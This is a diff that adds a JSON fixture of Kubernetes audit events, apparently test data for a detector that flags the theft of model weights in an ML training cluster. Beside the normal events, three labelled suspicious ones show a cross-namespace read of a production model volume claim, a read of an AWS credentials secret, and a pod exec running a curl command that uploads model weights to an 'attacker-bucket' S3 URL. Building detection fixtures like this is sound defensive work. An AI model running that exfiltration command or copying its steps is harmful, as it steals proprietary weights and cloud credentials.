@@ -1,0 +1,174 @@
+[
+  {
+    "_comment": "Normal: Pod list in ml-training namespace",
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "a1b2c3d4-5678-90ab-cdef-111111111111",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/namespaces/ml-training/pods",
+    "verb": "list",
+    "user": {
+      "username": "system:serviceaccount:ml-training:training-worker",
+      "groups": ["system:serviceaccounts"]
+    },
+    "sourceIPs": ["10.244.0.15"],
+    "objectRef": {
+      "resource": "pods",
+      "namespace": "ml-training",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"code": 200},
+    "stageTimestamp": "2024-11-15T10:30:45.123456Z"
+  },
+  {
+    "_comment": "Normal: Read training data PVC",
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Request",
+    "auditID": "a1b2c3d4-5678-90ab-cdef-222222222222",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/namespaces/ml-training/persistentvolumeclaims/training-data-v3",
+    "verb": "get",
+    "user": {
+      "username": "system:serviceaccount:ml-training:data-loader",
+      "groups": ["system:serviceaccounts"]
+    },
+    "sourceIPs": ["10.244.0.20"],
+    "objectRef": {
+      "resource": "persistentvolumeclaims",
+      "namespace": "ml-training",
+      "name": "training-data-v3",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"code": 200},
+    "stageTimestamp": "2024-11-15T10:31:12.456789Z"
+  },
+  {
+    "_comment": "Normal: Create checkpoint",
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Request",
+    "auditID": "a1b2c3d4-5678-90ab-cdef-333333333333",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/namespaces/ml-training/configmaps",
+    "verb": "create",
+    "user": {
+      "username": "system:serviceaccount:ml-training:training-worker",
+      "groups": ["system:serviceaccounts"]
+    },
+    "sourceIPs": ["10.244.0.15"],
+    "objectRef": {
+      "resource": "configmaps",
+      "namespace": "ml-training",
+      "name": "checkpoint-metadata-epoch-42",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"code": 201},
+    "stageTimestamp": "2024-11-15T11:45:33.789012Z"
+  },
+  {
+    "_comment": "SUSPICIOUS: Access to production model weights PVC",
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Request",
+    "auditID": "a1b2c3d4-5678-90ab-cdef-444444444444",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/namespaces/ml-production/persistentvolumeclaims/frontier-model-v3",
+    "verb": "get",
+    "user": {
+      "username": "system:serviceaccount:ml-training:training-worker",
+      "groups": ["system:serviceaccounts"]
+    },
+    "sourceIPs": ["10.244.0.15"],
+    "objectRef": {
+      "resource": "persistentvolumeclaims",
+      "namespace": "ml-production",
+      "name": "frontier-model-v3",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"code": 200},
+    "stageTimestamp": "2024-11-15T12:05:17.345678Z",
+    "annotations": {
+      "mlshield.io/threat-indicator": "Cross-namespace access to production model PVC from training namespace"
+    }
+  },
+  {
+    "_comment": "SUSPICIOUS: Access to AWS credentials secret",
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "RequestResponse",
+    "auditID": "a1b2c3d4-5678-90ab-cdef-555555555555",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/namespaces/ml-training/secrets/aws-credentials",
+    "verb": "get",
+    "user": {
+      "username": "system:serviceaccount:ml-training:training-worker",
+      "groups": ["system:serviceaccounts"]
+    },
+    "sourceIPs": ["10.244.0.15"],
+    "objectRef": {
+      "resource": "secrets",
+      "namespace": "ml-training",
+      "name": "aws-credentials",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"code": 200},
+    "stageTimestamp": "2024-11-15T12:06:02.567890Z",
+    "annotations": {
+      "mlshield.io/threat-indicator": "Training pod accessed cloud credential secret"
+    }
+  },
+  {
+    "_comment": "SUSPICIOUS: Exec into pod with curl command",
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "RequestResponse",
+    "auditID": "a1b2c3d4-5678-90ab-cdef-666666666666",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/namespaces/ml-training/pods/training-job-a1b2c/exec?command=bash&command=-c&command=curl+-X+PUT+https://attacker-bucket.s3.amazonaws.com/exfil/model.onnx+-T+/models/production/model.onnx",
+    "verb": "create",
+    "user": {
+      "username": "system:serviceaccount:ml-training:training-worker",
+      "groups": ["system:serviceaccounts"]
+    },
+    "sourceIPs": ["10.244.0.15"],
+    "objectRef": {
+      "resource": "pods",
+      "subresource": "exec",
+      "namespace": "ml-training",
+      "name": "training-job-a1b2c",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"code": 101},
+    "stageTimestamp": "2024-11-15T12:07:44.890123Z",
+    "annotations": {
+      "mlshield.io/threat-indicator": "Pod exec with curl uploading model weights to external S3 bucket"
+    }
+  },
+  {
+    "_comment": "Normal: Job completion status update",
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "a1b2c3d4-5678-90ab-cdef-777777777777",
+    "stage": "ResponseComplete",
+    "requestURI": "/apis/batch/v1/namespaces/ml-training/jobs/training-run-42/status",
+    "verb": "update",
+    "user": {
+      "username": "system:serviceaccount:kube-system:job-controller",
+      "groups": ["system:serviceaccounts"]
+    },
+    "sourceIPs": ["10.244.0.1"],
+    "objectRef": {
+      "resource": "jobs",
+      "subresource": "status",
+      "namespace": "ml-training",
+      "name": "training-run-42",
+      "apiGroup": "batch",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {"code": 200},
+    "stageTimestamp": "2024-11-15T14:22:11.234567Z"
+  }
+]
